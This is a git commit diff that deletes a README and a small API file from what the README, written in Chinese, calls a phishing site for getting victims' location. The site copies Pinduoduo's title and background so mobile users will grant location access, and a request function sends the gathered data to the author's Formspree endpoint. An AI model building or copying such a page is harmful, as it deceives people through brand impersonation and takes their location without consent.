848d346096246acad8ddab4098c107e4ba5cf513
bbbyqq <2287532812@qq.com>
2023-11-03 15:48:08 +0800

    初始化web分支

--- README.md
+++
@@ -1,8 +0,0 @@
-#钓鱼网站获取位置信息
-
-####设置接收邮箱需要去 https://formspree.io 注册一个账号，然后新建一个form，复制Your form's endpoint，这个即是请求URL，在src/api/Index/Index.js修改URL
-
-#注意事项
-
-####1、设置成拼多多标题和背景是因为需要用户手机点击允许获取位置信息才能实现
-####2、formspree免费用户一个月只有50次发送邮箱机会
--- src/api/Index/Index.js
+++
@@ -1,9 +0,0 @@
-import { request } from '../../utils/request'
-
-export function sendEmail (data) {
-  return request({
-    method: 'post',
-    url: 'https://formspree.io/xxxxxxxxxxxxxxxxx', // 此处替换成自己的form's endpoint
-    data: data
-  })
-}
